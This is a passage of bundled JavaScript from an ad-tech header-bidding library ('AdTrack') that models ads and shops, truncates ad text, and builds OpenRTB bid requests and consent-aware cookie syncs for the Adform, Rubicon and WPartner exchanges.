    },
    getClickUrl: function () {
      return this.clickUrl;
    },
    setFavicon: function (t) {
      t && (this.favicon = t);
    },
    getFavicon: function () {
      return this.favicon;
    },
    setProductDescription: function (t) {
      t && (this.description = t);
    },
    getProductDescription: function () {
      return this.description;
    }
  }, AdTrack.Shop = function () {
    this.shopName = "", this.shopSlogan = "", this.shopLogo = "", this.shopUrl = "", this.cleanShopUrl = "", this.logoutUrl = "";
  }, AdTrack.Shop.prototype = {
    setShopName: function (t) {
      t && (this.shopName = t);
    },
    getShopName: function () {
      return this.shopName;
    },
    setShopSlogan: function (t) {
      t && (this.shopSlogan = t);
    },
    getShopSlogan: function () {
      return this.shopSlogan;
    },
    setShopUrl: function (t) {
      this.shopUrl = t;
    },
    getShopUrl: function () {
      return this.shopUrl;
    },
    setCleanShopUrl: function (t) {
      t && (this.cleanShopUrl = t);
    },
    getCleanShopUrl: function () {
      return this.cleanShopUrl;
    },
    setShopLogo: function (t) {
      t && (this.shopLogo = t);
    },
    getShopLogo: function () {
      return this.shopLogo;
    },
    setLogoutUrl: function (t) {
      this.logoutUrl = t;
    },
    getLogoutUrl: function () {
      return this.logoutUrl;
    }
  }, AdTrack.AdChoices = function () {
    this.optional = !0, this.promoText = "", this.promoIcon = "", this.promoClickUrl = "#";
  }, AdTrack.AdChoices.prototype = {
    setPromoText: function (t) {
      this.promoText = t;
    },
    getPromoText: function () {
      return this.promoText;
    },
    setPromoIcon: function (t) {
      this.promoIcon = t;
    },
    getPromoIcon: function () {
      return this.promoIcon;
    },
    setPromoClickUrl: function (t) {
      t && (this.promoClickUrl = t);
    },
    getPromoClickUrl: function () {
      return this.promoClickUrl;
    },
    setOptional: function (t) {
      this.optional = !!t;
    },
    isOptional: function () {
      return this.optional;
    }
  }, AdTrack.AdSet = function () {
    this.ads = [], this.wrapParts = [], this.shop = null, this.adChoices = null, this.style = null;
  }, AdTrack.AdSet.prototype = {
    addAd: function (t) {
      t && this.ads.push(t);
    },
    addWrapPart: function (t) {
      t && this.wrapParts.push(t);
    },
    addShop: function (t) {
      this.shop = t;
    },
    getShop: function () {
      return this.shop;
    },
    addAdChoices: function (t) {
      this.adChoices = t;
    },
    getAdChoices: function () {
      return this.adChoices;
    },
    getAd: function (t) {
      return !isNaN(parseInt(t, 10)) && t >= 0 && t < this.ads.length ? this.ads[t] : null;
    },
    getWrapPart: function (t) {
      return !isNaN(parseInt(t, 10)) && t >= 0 && t < this.wrapParts.length ? this.wrapParts[t] : null;
    },
    getAdsCount: function () {
      return this.ads.length;
    },
    getWrapPartsCount: function () {
      return this.wrapParts.length;
    },
    setStyle: function (t) {
      this.style = t;
    },
    getStyle: function () {
      return this.style;
    }
  }, AdTrack.Validator = function () {
    this.maxl = -1, this.maxtl = -1, this.maxdl = -1;
  }, AdTrack.Validator.prototype = {
    isPositiveInt: function (t) {
      return t && !isNaN(parseInt(t, 10)) && t > 0;
    },
    setTextMaxLength: function (t) {
      this.isPositiveInt(t) && (this.maxl = t);
    },
    setTitleMaxLength: function (t) {
      this.isPositiveInt(t) && (this.maxtl = t);
    },
    setDescriptionMaxLength: function (t) {
      this.isPositiveInt(t) && (this.maxdl = t);
    },
    cutText: function (t, e) {
      var i = t.replace(/[&][a-zA-Z]*[;]/g, " ").length,
        r = [];
      if (t && "string" == typeof t && this.isPositiveInt(e) && i > e) {
        for (var n = (t = function (t) {
          for (var e = new RegExp(/[&][a-zA-Z]*[;]/g), i = e.exec(t); null != i;) {
            r.push({
              index: i.index,
              value: i[0]
            });
            var n = i[0];
            t = t.replace(new RegExp(n), " "), i = (e = new RegExp(/[&][a-zA-Z]*[;]/g)).exec(t);
          }
          return t;
        }(t)).slice(0, e - 3); n.match(/\.$/);) n = n.slice(0, n.length - 1);
        return (n = function (t) {
          for (var e = r.length - 1; e >= 0; e--) {
            var i = r[e];
            i.index < t.length && (t = t.substr(0, i.index) + i.value + t.substr(i.index + 1, t.length));
          }
          return t;
        }(n)).trim();
      }
      return t;
    },
    validateTextLengths: function (t) {
      var e, i;
      if (this.maxl > 0) {
        if (i = t.getWhole(), (e = this.cutText(i, this.maxl)).length == i.length) return;
        var r = i.length - (t.descriptionLength() + t.titleLength());
        e.length <= t.titleLength() + r ? (t.setTitle(e.length <= t.titleLength() ? e + "..." : t.getTitle() + "..."), t.clearDescription()) : (e = (e = e.replace(t.getTitle(), "")).slice(r, e.length), t.setDescription(e + "..."));
      } else this.maxtl > 0 && (i = t.getTitle(), e = this.cutText(i, this.maxtl), t.setTitle(e.length < t.titleLength() ? e + "..." : e)), this.maxdl > 0 && (i = t.getDescription(), e = this.cutText(i, this.maxdl), t.setDescription(e.length < t.descriptionLength() ? e + "..." : e));
    }
  }, AdTrack.Evaluator = function () {
    this.width = -1, this.height = -1, this.ol = -1, this.otl = -1, this.odl = -1;
  }, AdTrack.Evaluator.prototype = {
    isPositiveInt: function (t) {
      return t && !isNaN(parseInt(t, 10)) && t > 0;
    },
    setImgWidth: function (t) {
      this.isPositiveInt(t) && (this.width = t);
    },
    setImageHeight: function (t) {
      this.isPositiveInt(t) && (this.height = t);
    },
    setTextLength: function (t) {
      this.isPositiveInt(t) && (this.ol = t);
    },
    setTitleLength: function (t) {
      this.isPositiveInt(t) && (this.otl = t);
    },
    setDescriptionLength: function (t) {
      this.isPositiveInt(t) && (this.odl = t);
    },
    pickBestScreenshot: function (t, e) {
      if (t && t.length > 0) {
        for (var i = function (t, e, i) {
            var r = e / i,
              n = Math.abs(t.getRatio() - r);
            if (!t.isAbleToZoom(e, 0)) return Number.POSITIVE_INFINITY;
            var s = 10 * n;
            return s += t.width - e > 0 ? 0 : Math.abs(t.width - e) / 1e3;
          }, r = -1, n = Number.POSITIVE_INFINITY, s = 0; s < t.length; s++) {
          var a = this.width,
            o = this.height;
          -1 != a && -1 != o || (a = e ? 2 : 1, o = 1);
          var d = i(t[s], a, o);
          d < n && (n = d, r = s);
        }
        return t[-1 != r ? r : 0];
      }
      return null;
    },
    pickBestText: function (t) {
      if (t && t.length > 0) {
        for (var e = function (t, e, i) {
            var r,
              n,
              s = 0;
            return e < 0 && i < 0 && (e = 30, i = 80), e > 0 && t.titleLength() > 0 && (s += (r = t.titleLength() / e) > 1 ? Math.pow(r, 6) : Math.pow(1 / r, 2)), i > 0 && t.descriptionLength() > 0 && (s += (n = t.descriptionLength() / i) > 1 ? Math.pow(n, 4) : Math.pow(1 / n, 2)), r && n ? s : Number.POSITIVE_INFINITY;
          }, i = -1, r = Number.POSITIVE_INFINITY, n = 0; n < t.length; n++) {
          var s;
          this.ol > 0 ? (a = t[n], o = this.ol, d = void 0, s = (d = o - (a.titleLength() + a.descriptionLength() + 3)) < 0 ? Math.pow(Math.abs(d), 1.35) : d) : s = e(t[n], this.otl, this.odl), s < r && (r = s, i = n);
        }
        return t[-1 != i ? i : 0];
      }
      var a, o, d;
      return null;
    }
  }, AdTrack.TextObj = function (t, e) {
    this.title = t, this.originalTitle = t, this.description = e, this.originalDescription = e;
  }, AdTrack.TextObj.prototype = {
    setTitle: function (t) {
      t && t.length > 0 && (this.title = t);
    },
    getTitle: function () {
      return this.title;
    },
    getOriginalTitle: function () {
      return this.originalTitle;
    },
    setDescription: function (t) {
      t && t.length > 0 && (this.description = t);
    },
    clearDescription: function () {
      this.description = "";
    },
    getOriginalDescription: function () {
      return this.originalDescription;
    },
    getDescription: function () {
      return this.description;
    },
    getWhole: function () {
      return this.description ? this.title + " - " + this.description : this.title;
    },
    getWholeOriginal: function () {
      return this.originalDescription ? this.originalTitle + " - " + this.originalDescription : this.originalTitle;
    },
    titleLength: function () {
      return this.title.length;
    },
    descriptionLength: function () {
      return this.description.length;
    }
  }, AdTrack.ScreenshotObj = function (t, e, i, r, n) {
    if (this.maxZoomInPercentage = 50, this.url = t, this.onError = r, this.width = e, this.height = i, this.onload = n, 0 == e && 0 == i) {
      var s = new Image();
      s.onload = function (t) {
        this.width = t.target.width, this.height = t.target.height, "function" == typeof this.onload && this.onload();
      }.bind(this), s.src = this.url, this.width = s.width, this.height = s.height;
    } else "function" == typeof this.onload && setTimeout(this.onload, 10);
  }, AdTrack.ScreenshotObj.prototype = {
    getRatio: function () {
      return this.width / this.height;
    },
    isAbleToZoom: function (t, e) {
      var i = this.width * (1 + this.maxZoomInPercentage / 100),
        r = this.height * (1 + this.maxZoomInPercentage / 100);
      return i >= t && r >= e;
    }
  }, AdTrack.ImageCollection = function () {
    this.timeout = 2500, this.timeouted = !1, this.closed = !1, this.ready = !0, this.imagesLoaded = 0, this.callbacks = [], this.screenshots = [], setTimeout(function () {
      this.ready || (this.timeouted = !0, this.loaded());
    }.bind(this), this.timeout);
  }, AdTrack.ImageCollection.prototype = {
    then: function (t) {
      "function" == typeof t && (this.ready ? t(this.screenshots) : this.callbacks.push(t));
    },
    addScreenshot: function (t, e, i, r) {
      this.ready = !1, this.screenshots.push(new AdTrack.ScreenshotObj(t, e, i, r, function () {
        this.timeouted || (this.imagesLoaded++, this.imagesLoaded == this.screenshots.length && (this.ready = !0, this.closed && this.loaded()));
      }.bind(this)));
    },
    close: function () {
      this.ready ? this.loaded() : this.closed = !0;
    },
    loaded: function () {
      for (var t = 0; t < this.callbacks.length; t++) "function" == typeof this.callbacks[t] && this.callbacks[t](this.screenshots);
      this.callbacks = [];
    }
  };
}, function (t, e) {
  AdTrack.AdformHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.adformUtils = new AdTrack._AdFormUtils(), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.kwHandlers = [], this.track.keywordsModule && ("hbbtv" === this.track.environment ? (this.definition.options.dmpmKeywords || "hbbtv" === this.chd.tag) && (this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("dmpm-tv")), this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("hbbtv-ua-parser"))) : (this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("html-extract")), this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("ua-extract")))), this.noFPBNs = AdTrack.Utils.objectValues(this.definition.options.noFPBNs);
  }, AdTrack.AdformHelper.prototype = {
    BANNER: 1,
    VAST: 2,
    OUTDOOR: 4,
    onBidRequest: function () {
      this.definition.options.customDislableKeywordReport && 1 == this.definition.options.customDislableKeywordReport || this.track.keywordsModule && this.track.keywordsModule.report(this, this.chd.tag);
    },
    isBlacklisted: function (t, e) {
      return e.some(function (e) {
        return new RegExp("/" + e + "/").test(t);
      });
    },
    bid: function (t, e, i, r) {
      var n = function (n) {
        var s = n;
        n = n[0];
        var a = null,
          o = this.getAdData(n, i);
        if (o) {
          var d = !1,
            c = !1;
          if (i === this.BANNER && (d = AdTrack.Utils.isBlackListedAds(o), c = AdTrack.Utils.testAd(o, this.definition.options.contentBlackList || [])), !1 !== d || !1 !== c) return d && this.track.doError("Blocked Adform creative from " + d, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, n.win_crid || "", n.deal_id || "", n.win_bid, o), null;
          this.response = n;
          var h = this.noFPBNs.some(function (t) {
            return t == n.win_crid;
          });
          n.win_cur === this.chd.currency ? (a = AdTrack.Price.create(n.win_bid, this.chd.currency, n.deal_id, h), "DID-811-92131" == n.deal_id && this.track.doError("Deal ID (DID-811-92131) received directly from AdForm channel with price " + n.win_bid + " " + n.win_cur, "debug"), t.setCreativeId(n.win_crid), t.setPrice(a), t.setWidth(n.width), t.setHeight(n.height), this.prebidVideo && (t.setVideoVastXML(o), t.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(this.track.unitID, e, this.chd, this.track.server)))) : this.track.doError("Channel " + this.chd.tag + " responsed with wrong currency: " + n.win_cur + " instead of: " + this.chd.currency);
        }
        r && r(a, s), this.onBidRequest();
      }.bind(this);
      if ("457593" != e && "610175" != e || this.track.settings.ip && "84.242.121.62" === this.track.settings.ip) {
        var s = this.generateAdxUrl(e, i),
          a = this;
        AdTrack.Ajax.request({
          label: "Adform bid",
          url: s,
          method: "",
          async: !this.definition.options.noAsync,
          json: !0,
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (t) {
          n(t);
        }).fail(function (t, e) {
          e ? a.track.evBidTimeout(a.definition, a.chd) : a.track.evBidError(a.definition, a.chd), this.error && a.track.definition.options.hb, r && r(null, null);
        }).send();
      } else n([{}]);
    },
    generateAdxUrl: function (t, e) {
      var i = "adx.adform.net";
      ["classic_newsonground.com_autorefresh_sticky", "classic_bestpap.com_autorefresh_sticky", "classic_techcurved.com_autorefresh_sticky", "classic_articlesnew.com_autorefresh_fixed_desktop", "classic_weekly-ads.us_generic_fixed", "classic_tellywebnews.com_autorefresh_fixed_desktop"].indexOf(this.track.unitID.getName()) > -1 ? i = "adx2.adform.net" : [1098653, 1098654, 1098656, 1098729, 1098727, 1098728].indexOf(Number(t)) > -1 && (i = "adx3.adform.net");
      var r = {};
      r.t = e || this.BANNER;
      var n = this.getKeywords();
      if (n && (r.mkw = n), "hbbtv" === this.track.environment) {
        var s = AdTrack.Utils.getDeviceId();
        s && (r.adid = s);
      }
      AdTrack.url && ("string" == typeof this.chd.flag && -1 !== this.chd.flag.indexOf("premium") || 1 == this.chd.unmaskedDomain) && (r.url = AdTrack.url), this.chd.currency && (r.rcur = this.chd.currency), this.chd.bidFloor && (r.minp = this.chd.bidFloor);
      var a = this.track.getSupplyChain(!0);
      a && (r.schain = a);
      var o = this.adformUtils.generateAdxUrl([t], r, null, i),
        d = null;
      if (AdTrack.CMP && (d = AdTrack.CMP.getConsentData()), d && (this.track.evBidConsent(this.definition, this.chd, !0), o += (d.gdprApplies ? "&gdpr=1" : "") + (d.consentString ? "&gdpr_consent=" + d.consentString : "")), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var c = {},
          h = AdTrack.UserID.getAllUserIdsAsEids();
        h && (c = function (t) {
          return t.reduce((t, e) => {
            const i = e.source;
            return t[i] = t[i] || {}, e.uids.forEach(e => {
              const r = e.id + "";
              t[i][r] = t[i][r] || [], t[i][r].push(e.atype);
            }), t;
          }, {});
        }(h)), c && c !== {} && (o += "&eids=" + encodeURIComponent(AdTrack.Utils.b2a(JSON.stringify(c))));
      }
      return o;
    },
    getKeywords: function () {
      var t = null;
      this.kwHandlers.length > 0 && !this.chd.noKeywords && this.track.keywordsModule && this.track.keywordsModule.processor(this, this.chd.tag).getKeywords(function (e) {
        e && (e = Object.keys(e)) && e.length > 0 && (t = e.map(function (t) {
          return encodeURI(t);
        }).join());
      }.bind(this));
      return t;
    },
    getAdData: function (t, e) {
      if (t && t.response) {
        if ("banner" === t.response && (e === this.BANNER || e === this.OUTDOOR && this.chd.html5)) return t.banner;
        if ("outdoor" === t.response && e === this.OUTDOOR) return t.outdoor;
        if ("vast_url" === t.response && e === this.VAST && !this.prebidVideo) return t.vast_url;
        if ("vast_content" === t.response && e === this.VAST) return t.vast_content;
      }
    }
  };
}, function (t, e) {
  AdTrack.AdformOpenRTBHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.helper = new AdTrack.AdformHelper(t, e, i), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.kwHandlers = [], this.track.keywordsModule && (this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("html-extract")), this.kwHandlers.push(this.track.keywordsModule.handlerFactory().create("ua-extract"))), this.noFPBNs = AdTrack.Utils.objectValues(this.definition.options.noFPBNs);
  }, AdTrack.AdformOpenRTBHelper.prototype = {
    BANNER: 1,
    VIDEO: 2,
    NATIVE: 4,
    bid: function (t, e, i, r) {
      if ("457593" != e && "610175" != e || this.track.settings.ip && "84.242.121.62" === this.track.settings.ip) {
        var n = this.createData(e, i),
          s = this.__onSuccess.bind(this),
          a = this.__onError.bind(this),
          o = this;
        AdTrack.Ajax.request({
          label: "Adform openrtb bid",
          url: "//adx.adform.net/adx/openrtb",
          method: "POST",
          data: JSON.stringify(n),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (i) {
          s(t, o, i, e, r);
        }).fail(function (t, e) {
          a(t, e, o, r);
        }).send();
      } else r && r(null, null);
    },
    createData: function (t, e) {
      var i = AdTrack.Utils.uuid(),
        r = AdTrack.Utils.uuid(),
        n = {
          ext: {}
        },
        s = {
          ext: {}
        },
        a = null,
        o = null,
        d = this.helper.getKeywords(),
        c = this.chd.currency || "EUR",
        h = !1,
        l = !1;
      if (AdTrack.CMP && (a = AdTrack.CMP.getConsentData()), a && (h = !0, n.ext.consent = a.consentString ? a.consentString : "", s.ext.gdpr = a.gdprApplies ? 1 : 0), AdTrack.USP && (o = AdTrack.USP.getConsentData()), o && o.consentString && (l = !0, s.ext.us_privacy = o.consentString), (h || l) && this.track.evBidConsent(this.definition, this.chd, h, l), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var u = AdTrack.UserID.getAllUserIdsAsEids();
        u && u.length > 0 && (n.ext.eids = u);
      }
      var p = AdTrack.Utils.isPremiumAdform(this.chd),
        f = -1 !== this.chd.tag.indexOf("-im"),
        g = !p && !f,
        m = this.createImp(t, e, c),
        k = {
          id: i,
          cur: [c],
          device: {
            ip: this.track.settings.ip ? this.track.settings.ip : "",
            w: window.innerWidth,
            h: window.innerHeight,
            ua: navigator.userAgent,
            language: navigator.language,
            js: 1,
            dnt: AdTrack.Utils.getDNT()
          },
          site: {
            domain: g ? "r2b2.cz" : AdTrack.Utils.getDomain(this.definition.info)
          },
          ext: {
            pt: "gross"
          },
          imp: [m],
          source: {
            tid: r,
            fd: 1
          },
          user: n,
          regs: s
        };
      g || (k.site.page = AdTrack.Utils.getUrlWithoutSafeFrame(this.track), k.site.ref = AdTrack.Utils.getReferrer()), d && (k.site.content = {
        keywords: d
      }, k.site.keywords = d);
      var b = this.track.getSupplyChain();
      return b && !f && (k.source.ext = {
        schain: b
      }), k;
    },
    createImp: function (t, e, i) {
      for (var r = [{
          w: this.chd.width,
          h: this.chd.height
        }], n = this.chd.sizes ? this.chd.sizes : [], s = 0; s < n.length; s++) 2 === n[s].length && r.push({
        w: n[s][0],
        h: n[s][1]
      });
      var a = {
        id: Math.floor(1e6 * Math.random()),
        tagid: "" + t,
        ext: {
          bidder: {}
        }
      };
      if (this.chd.bidFloor && (a.bidfloor = this.chd.bidFloor, a.bidfloorcur = i), e === this.BANNER) a.banner = {
        format: r
      };else if (e === this.NATIVE) a.banner = {
        format: [{
          w: 13,
          h: 31
        }]
      };else if (e === this.VIDEO) {
        var o = this.chd.width ? this.chd.width : 640,
          d = this.chd.height ? this.chd.height : 480;
        a.video = {
          api: [1, 2],
          linearity: 1,
          maxduration: 90,
          mimes: ["video/mp4", "video/webm", "video/3gpp"],
          placement: 3,
          playbackmethod: [5],
          playerSize: [[o, d]],
          protocols: [2, 3, 5, 6],
          skip: 1
        };
      }
      return a;
    },
    __onSuccess: function (t, e, i, r, n) {
      if (e.response = i, e.price = null, i && i.seatbid && i.seatbid[0] && i.seatbid[0].bid && i.seatbid[0].bid[0]) {
        var s = i.seatbid[0].bid[0];
        if (s && s.adm) {
          var a = AdTrack.Utils.isBlackListedAds(s.adm),
            o = AdTrack.Utils.testAd(s.adm, e.definition.options.contentBlackList || []);
          if (!1 !== a || !1 !== o) return a && e.track.doError("Blocked Adform creative from " + a, "info"), e.chd.logs && e.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(e.track.server, e.chd.logs.blocked_creative, e.chd.tag, s.crid || "", s.dealid || "", s.price, s.adm), null;
          var d = e.helper.noFPBNs.some(function (t) {
            return t == s.crid;
          });
          i.cur === e.chd.currency ? (e.price = AdTrack.Price.create(s.price, i.cur, s.dealid, d), "DID-811-92131" == s.dealid && e.track.doError("Deal ID (DID-811-92131) received directly from AdForm channel with price " + s.price + " " + i.cur, "debug"), t.setPrice(e.price), t.setCreativeId(s.crid), t.setWidth(s.w || e.chd.width), t.setHeight(s.h || e.chd.height), this.helper.prebidVideo && (t.setVideoVastXML(s.adm), t.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(this.track.unitID, r, this.chd, this.track.server)))) : e.track.doError("Channel " + e.chd.tag + " responsed with wrong currency: " + i.cur + " instead of: " + e.chd.currency);
        }
      }
      e.helper.onBidRequest(), n && n(e.price, i);
    },
    __onError: function (t, e, i, r) {
      e ? i.track.evBidTimeout(i.definition, i.chd) : i.track.evBidError(i.definition, i.chd), i.price = null, r && r(null, null);
    },
    getKeywords: function () {
      var t = null;
      this.kwHandlers.length > 0 && !this.chd.noKeywords && this.track.keywordsModule && this.track.keywordsModule.processor(this, this.chd.tag).getKeywords(function (e) {
        e && (e = Object.keys(e)) && e.length > 0 && (t = e.map(function (t) {
          return encodeURI(t);
        }).join());
      }.bind(this));
      return t;
    }
  };
}, function (t, e) {
  var i;
  AdTrack.RubiconHelper = function (t, e, i, r) {
    this.track = t, this.definition = e, this.chd = i, this.accountId = r || AdTrack.Config.getAccountId("rubicon"), this.external = this.accountId !== AdTrack.Config.getAccountId("rubicon"), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.track.shouldCsync("rubicon") && AdTrack.UserSync.addUserSync("rubicon", 52, function () {
      AdTrack.RubiconCSync();
    }.bind(this), this.track.settings);
  }, AdTrack.RubiconHelper.prototype = {
    VIDEO: "video",
    NATIVE: "native",
    bid: function (t, e, i, r) {
      var n = this.createData(e, i),
        s = this;
      AdTrack.Ajax.request({
        label: "Rubicon bid",
        url: "https://prebid-server.rubiconproject.com/openrtb2/auction",
        method: "POST",
        data: JSON.stringify(n),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (i) {
        var n = null;
        if (s.response = i, i && i.seatbid && i.seatbid[0] && i.seatbid[0].bid && i.seatbid[0].bid[0]) {
          i.cur && i.cur !== AdTrack.Price.USD && s.track.doError("Channel " + s.chd.tag + " responsed with wrong currency: " + i.cur);
          var a = i.seatbid[0].bid[0];
          if (n = AdTrack.Price.create(a.price, i.cur || AdTrack.Price.USD, null), t.setPrice(n), t.setWidth(a.w || s.chd.width), t.setHeight(a.h || s.chd.height), s.prebidVideo) {
            if (!a.adm) return void r(null, null);
            t.setVideoVastXML(a.adm), t.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(s.track.unitID, e, s.chd, s.track.server));
          }
        }
        r && r(n, i);
      }).fail(function (t, e) {
        e ? s.track.evBidTimeout(s.definition, s.chd) : s.track.evBidError(s.definition, s.chd), s.price = null, r && r(null, null);
      }).send();
    },
    createData: function (t, e) {
      var i = t.split("-");
      2 !== i.length && this.track.doError("Wrong format for key, should be: [site_id]-[zone_id]");
      var r = this.accountId,
        n = i[0],
        s = i[1],
        a = AdTrack.Utils.uuid(),
        o = this.track.unitID.getName(),
        d = {
          ext: {
            data: {}
          }
        },
        c = {
          ext: {}
        },
        h = {
          exp: 300,
          id: o,
          secure: 1,
          bidfloor: this.chd.bidFloor || .01,
          bidfloorcur: AdTrack.Price.USD,
          ext: {
            prebid: {
              adunitcode: o,
              bidder: {
                rubicon: {
                  accountId: Number(r),
                  siteId: Number(n),
                  zoneId: Number(s),
                  floor: this.chd.bidFloor || .01
                }
              }
            }
          }
        };
      if (e === this.NATIVE) {
        var l = {
          assets: [{
            required: 1,
            id: 3,
            img: {
              wmin: 600,
              hmin: 314,
              type: 3
            }
          }, {
            required: 0,
            id: 2,
            img: {
              wmin: 16,
              hmin: 16,
              type: 1
            }
          }, {
            required: 1,
            id: 0,
            title: {
              len: 300
            }
          }, {
            required: 1,
            id: 4,
            data: {
              type: 2
            }
          }, {
            required: 0,
            id: 5,
            data: {
              type: 1
            }
          }, {
            required: 0,
            id: 1,
            data: {
              type: 12
            }
          }],
          eventtrackers: [{
            event: 1,
            methods: [1]
          }],
          context: 1,
          plcmttype: 1,
          ver: "1.2"
        };
        h.native = {
          request: JSON.stringify(l),
          ver: "1.2"
        };
      } else if (e === this.VIDEO) {
        var u = this.chd.width ? this.chd.width : 640,
          p = this.chd.height ? this.chd.height : 480;
        h.ext.prebid.bidder.rubicon.video = {
          size_id: 203
        }, h.video = {
          context: "outstream",
          playerSize: [[u, p]],
          mimes: ["video/mp4", "video/webm", "video/3gpp"],
          protocols: [2, 3, 5, 6],
          playbackmethod: [5],
          placement: 3,
          maxduration: 90,
          linearity: 1,
          api: [1, 2],
          skip: 1,
          w: u,
          h: p
        };
      }
      var f = !1,
        g = !1,
        m = null;
      AdTrack.CMP && (m = AdTrack.CMP.getConsentData()), m && (f = !0, d.ext.consent = m.consentString ? m.consentString : "", m.addtlConsent && (d.ext.ConsentedProvidersSettings = {
        consented_providers: m.addtlConsent
      }), c.ext.gdpr = m.gdprApplies ? 1 : 0);
      var k = null;
      if (AdTrack.USP && (k = AdTrack.USP.getConsentData()), k && k.consentString && (g = !0, c.ext.us_privacy = k.consentString), (f || g) && this.track.evBidConsent(this.definition, this.chd, f, g), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var b = AdTrack.UserID.getAllUserIdsAsEids();
        b && (d.ext.eids = b);
      }
      var v = {
          tid: a
        },
        A = this.track.getSupplyChain();
      return A && !this.external && (v.ext = {
        schain: A
      }), {
        id: a,
        cur: ["USD"],
        source: v,
        tmax: 1e3,
        imp: [h],
        ext: {
          prebid: {
            auctiontimestamp: Date.now(),
            channel: {
              name: "pbjs",
              version: "v8.5.0"
            },
            cache: {
              vastxml: {
                returnCreative: !0
              }
            },
            targeting: {
              includewinners: !0,
              includebidderkeys: !1,
              pricegranularity: {
                ranges: [{
                  max: 20,
                  increment: .1
                }]
              }
            },
            bidders: {
              rubicon: {
                integration: "pbjs"
              }
            }
          }
        },
        site: {
          domain: AdTrack.Utils.getDomain(this.definition.info),
          page: AdTrack.Utils.getReferrer() || AdTrack.Utils.getUrlWithoutSafeFrame(this.track),
          ref: AdTrack.Utils.getReferrer(),
          ext: {
            data: {}
          }
        },
        device: {
          ip: this.track.settings.ip ? this.track.settings.ip : "",
          ua: navigator.userAgent,
          js: 1,
          dnt: AdTrack.Utils.getDNT(),
          h: window.innerHeight,
          w: window.innerWidth,
          language: AdTrack.Utils.getLanguage(!0, !0)
        },
        regs: c,
        user: d,
        test: this.chd.test ? 1 : 0
      };
    }
  }, AdTrack.RubiconCSync = AdTrack.RubiconCSync || (i = !1, function () {
    if (!i) {
      var t = "https://eus.rubiconproject.com/usync.html",
        e = null;
      if (AdTrack.CMP && (e = AdTrack.CMP.getConsentData()), e) {
        var r = e.consentString || "";
        t += "?gdpr=" + (e.gdprApplies ? 1 : 0) + "&gdpr_consent=" + r;
      }
      var n = null;
      if (AdTrack.USP && (n = AdTrack.USP.getConsentData()), n && n.consentString) {
        var s = "us_privacy=" + encodeURIComponent(n.consentString),
          a = t.indexOf("?");
        t += -1 === a ? "?" : "&", t += s;
      }
      AdTrack.Utils.csyncFrame(t), i = !0;
    }
  });
}, function (t, e) {
  var i;
  AdTrack.WPartnerHelper = function (t, e, i, r) {
    this.track = t, this.definition = e, this.chd = i, this.response = null, this.accountId = r || AdTrack.Config.getAccountId("wpartner"), this.slot = "", this.siteObject = {}, this.pageview = {}, this.bidTimeout = this.chd.timeout || 800, this.track.shouldCsync("wpartner") && AdTrack.UserSync.addUserSync("wpartner", 676, function () {
      AdTrack.WPartnerCSync(this.pageview);
    }.bind(this), this.track.settings);
  }, AdTrack.WPartnerHelper.prototype = {
    NATIVE: "native",
    BANNER: "banner",
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e, i, r) {
      if (AdTrack.UserSync.isVendorAllowed(676)) {
        var n = e.split("#");
        this.slot = n.length > 1 ? n[1] : n[0], this.siteObject = this.getSiteObj();
        var s = "https://ssp.wp.pl/bidder/?cs=" + AdTrack.Cookies.cookiesEnabled + "&bdver=5.8&pbver=7.43.0&inver=0",
          a = this.createData(this.slot, i),
          o = this;
        AdTrack.Ajax.request({
          label: "wpartner bid",
          url: s,
          method: "POST",
          data: JSON.stringify(a),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.bidTimeout,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this),
          withCredentials: !0
        }, this.track.errorReporting).done(function (e) {
          var n = null;
          if (e) if (o.pageview.sn = e.sn || "mc_adapter", e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
            var s = e.seatbid[0].bid[0];
            if (function (t) {
              const e = new RegExp(/^<\?xml/);
              return t.adm && t.adm.match(e);
            }(s) || function (t) {
              const e = new RegExp(/^{['"]native['"]/);
              return t.admNative || t.adm && t.adm.match(e);
            }(s) && i !== o.NATIVE) return o.track.doError("[" + o.chd.tag + "] served different mediatype"), void (r && r(null, null));
            if (!s.ext || !s.ext.siteid) return o.track.doError("[" + o.chd.tag + "] missing siteid in response " + (s.ext ? "(no siteid)" : "(no ext)")), void (r && r(null, null));
